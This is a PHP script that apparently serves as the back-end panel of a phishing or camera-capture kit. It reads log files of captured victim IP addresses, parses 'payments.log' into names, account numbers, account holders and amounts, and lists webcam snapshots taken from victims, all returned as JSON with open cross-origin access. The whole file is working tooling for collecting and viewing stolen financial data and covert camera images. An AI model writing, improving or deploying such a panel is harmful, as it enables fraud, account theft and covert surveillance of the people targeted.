<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$response = [
    'ips' => [],
    'payments' => [],
    'cameras' => [],
    'last_update' => date('Y-m-d H:i:s')
];

// Read IPs from multiple sources
if (file_exists('saved.ips.txt')) {
    $ips = file('saved.ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($ips as $ip) {
        $ip = trim($ip);
        if (!empty($ip)) {
            $response['ips'][] = [
                'ip' => str_replace('IP: ', '', $ip),
                'time' => date('H:i:s'),
                'timestamp' => time()
            ];
        }
    }
}

// Also check captured_data.log
if (file_exists('captured_data.log')) {
    $content = file_get_contents('captured_data.log');
    preg_match_all('/IP: ([^\s]+)/', $content, $matches);
    foreach ($matches[1] as $ip) {
        $response['ips'][] = [
            'ip' => $ip,
            'time' => date('H:i:s'),
            'timestamp' => time()
        ];
    }
}

// Read Payment Data
if (file_exists('payments.log')) {
    $content = file_get_contents('payments.log');
    $entries = explode("==========================\n", $content);
    
    foreach ($entries as $entry) {
        $entry = trim($entry);
        if (empty($entry)) continue;
        
        $payment = [];
        $lines = explode("\n", $entry);
        
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line) || strpos($line, '===') !== false) continue;
            
            if (strpos($line, ':') !== false) {
                list($key, $value) = explode(':', $line, 2);
                $key = trim($key);
                $value = trim($value);
                
                switch ($key) {
                    case 'Type':
                        $payment['transactionType'] = $value;
                        break;
                    case 'Service':
                        $payment['service'] = $value;
                        break;
                    case 'Name':
                        $payment['fullName'] = $value;
                        break;
                    case 'Account':
                        $payment['accountNumber'] = $value;
                        break;
                    case 'Holder':
                        $payment['accountHolder'] = $value;
                        break;
                    case 'Amount':
                        $payment['amount'] = $value;
                        break;
                    case 'Description':
                        $payment['description'] = $value;
                        break;
                    case 'Snap File':
                        $payment['snapFile'] = $value;
                        break;
                }
            }
        }
        
        if (!empty($payment)) {
            $payment['time'] = date('H:i:s');
            $payment['timestamp'] = time();
            $response['payments'][] = $payment;
        }
    }
    
    // Reverse for newest first
    $response['payments'] = array_reverse($response['payments']);
}

// Read Camera Snaps
$camFiles = glob('cam*.png');
if ($camFiles) {
    // Sort by newest first
    usort($camFiles, function($a, $b) {
        return filemtime($b) - filemtime($a);
    });
    
    foreach ($camFiles as $file) {
        $response['cameras'][] = [
            'filename' => basename($file),
            'url' => $file,
            'time' => date('H:i:s', filemtime($file)),
            'timestamp' => filemtime($file)
        ];
    }
}

// Remove duplicates
$response['ips'] = array_unique($response['ips'], SORT_REGULAR);

echo json_encode($response, JSON_PRETTY_PRINT);
?>